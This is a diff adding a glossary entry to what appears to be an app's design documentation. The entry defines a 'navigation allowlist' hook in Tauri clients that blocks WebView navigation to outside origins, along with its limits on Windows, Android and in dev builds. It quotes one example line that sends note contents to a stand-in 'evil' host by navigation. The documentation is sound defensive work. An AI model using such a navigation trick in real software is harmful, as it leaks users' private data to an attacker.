@@ -1346,6 +1346,16 @@ The IETF group-key-agreement protocol standardized as RFC 9420. Myne plans to us
 Used in: `spec/protocol.md` §11 (out of scope for v0.1)
 Reference: RFC 9420.
 
+### **navigation allowlist** &nbsp; 🛠️ *Tooling*
+
+The host-side rule that refuses every WebView navigation to an origin that is not the app's own. A `on_navigation` hook in each Tauri client (`src-tauri/src/navigation.rs`, `mobile/src-tauri/src/navigation.rs`), **not** a CSP directive, and that distinction is the reason it exists: no engine implements a directive that governs a top-level navigation (`navigate-to` was dropped from the spec, and `default-src` falls back only for fetch directives), so no policy written in `tauri.conf.json` can refuse `location = "https://evil/?d=" + noteBody`. The fetch half of that channel is closed by `connect-src`; this closes the navigation half. Landed desktop-side with `decisions.md` 2026-08-04 (entry 0445) and mobile-side with 2026-08-15 (entry 0502).
+
+Three limits are part of the term rather than caveats on it. On Windows the hook sees only top-level navigations, so a sub-frame is bounded by `frame-src` alone. On **Android** the hook is `WebViewClient.shouldOverrideUrlLoading`, which the platform does not call for POST, so a form submission is invisible to the allowlist and is bounded by `form-action 'none'` instead: the allowlist and that directive are complementary, not redundant. And in a dev build the frontend is served by Vite rather than the `tauri://` protocol handler, so no CSP is attached at all and the allowlist is the only one of these controls that runs.
+
+Distinct from the [value-shape allowlist](#value-shape-allowlist), which constrains what a custom theme may *say*, not where the app may *go*.
+
+Used in: `threat-model.md` §7; `decisions.md` 2026-08-04, 2026-08-15
+
 ### **next major version (post-v0.1)** &nbsp; 📦 *Product*
 
 *(Aliases: historically drafted as "v005" / "appname-v005"; `design-notes.md` is append-only and preserves that spelling verbatim — a reader who meets "v005" there maps it here.)*
